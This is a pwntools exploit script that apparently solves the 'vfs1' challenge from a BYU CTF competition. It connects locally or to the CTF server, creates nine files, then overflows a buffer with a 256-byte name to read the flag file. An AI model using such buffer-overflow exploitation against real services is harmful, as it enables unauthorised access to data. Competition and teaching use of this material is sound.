from pwn import *


# initialize the binary
binary = "./vfs1"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("byuctf.xyz", 40008)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()

# create 9 unimportant files
for i in range(9):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.sendline(b"1")

# create 10th file to fill up buffer
p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b"> ")
p.sendline(b"flag")
p.recvuntil(b"> ")
p.sendline(b"a"*256)

# read flag
p.recvuntil(b"> ")
p.sendline(b"4")
p.recvuntil(b"> ")
p.sendline(b"9")

p.interactive()